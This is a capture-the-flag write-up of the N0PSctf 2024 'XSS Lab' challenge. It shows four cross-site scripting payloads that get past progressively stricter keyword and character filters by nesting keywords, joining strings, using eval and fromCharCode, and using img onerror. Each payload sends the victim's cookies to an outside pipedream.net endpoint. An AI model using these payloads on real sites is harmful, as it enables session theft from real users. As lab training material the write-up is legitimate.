# N0PSctf 2024

## XSS Lab

> xss, EVERYWHERE
>
> Note : If your payload does not seem to work at first, please use RequestBin to check before contacting the support.
> 
> Author: algorab
> 

Tags: _web_

## Solution
We get a simple web page that lets us send a payload. When editing the page tells us `Bot will visit https://nopsctf-xss-lab.chals.io/?payload=abc` and after pressing `Send this payload` the page shows `Page visited!`.

Lets try some fairly vanilla payload: 
```js
<script>fetch('https://xxxxxxxxxxxxx.x.pipedream.net?'+document.cookie);</script>
```

And sure enough, the endpoint is called with `/?xss2=/bf2a73106a3aa48bab9b8b47e4bd350e`. On no... another one? We are at stage `XXS Me 2` and the page tells us we have to bypass a filter this time:

```python
def filter_2(payload):
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
```

This is not too hard, we can use the `sscriptcript` trick. This works since the replacement is not done again, so the additional `script` is replaced with an empty string, transforming `sscriptcript` to `script. Our payload looks like this:

```js
<sscriptcript>fetch('https://xxxxxxxxxxxxx.x.pipedream.net?'+document.cookie);</sscriptcript>
```

We pass the filter and get to stage 3, with a new, enhanced filter.

```python
def filter_3(payload):
    if "://" in payload.lower():
return "Nope"
    if "document" in payload.lower():
return "Nope"
    if "cookie" in payload.lower():
return "Nope"
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
```

We cannot use `://`, `document` or `cookie` anymore. This can be bypassed by joining strings. For the `document.cookie` part we dont want it to be a string but javascript that will be evaluated. So we call `eval` manually on the string, case closed.

```js
<sscriptcript>fetch(['https',':/','/'].join``+'xxxxxxxxxxxxx.x.pipedream.net?'+eval(['doc','ument'].join``+'.'+['coo','kie'].join``));</sscriptcript>
```

Sigh, another stage, with more filtering.

```python
def filter_4(payload):
    if any(c in payload for c in '+"/'):
return "Nope"
    if "://" in payload.lower():
return "Nope"
    if "document" in payload.lower():
return "Nope"
    if "cookie" in payload.lower():
return "Nope"
    return payload.replace("script", "").replace("img", "").replace("svg", "")
```

This time we aren't allowed any character like `+`, `"` or `/` in our payload. We don't use `"` but we concatenate strings with `+`. Luckily we just can call `string.concat` instead. Most of the forward slash characters we can replace with their ascii code like `String.fromCharCode(0x2f)` but the closing html tag is a problem. So we fall back to the `<img src=x onerror=your code goes here...>` form, since the tag doesn't need to be closed. We also don't put the js code in quotes after the `onerror` attribute, that works just fine.

```js
<iimgmg src=x onerror=fetch(['https',':',String.fromCharCode(0x2f),String.fromCharCode(0x2f)].join``.concat('en9ek3a47biul.x.pipedream.net?').concat(eval(['doc','ument'].join``.concat('.'.concat(['coo','kie'].join``)))))>
```

And sure enough, we passed the last stage and the endpoint is called with `flag=N0PS{cR05s_S1t3_Pr0_5cR1pT1nG}`.

Flag `N0PS{cR05s_S1t3_Pr0_5cR1pT1nG}`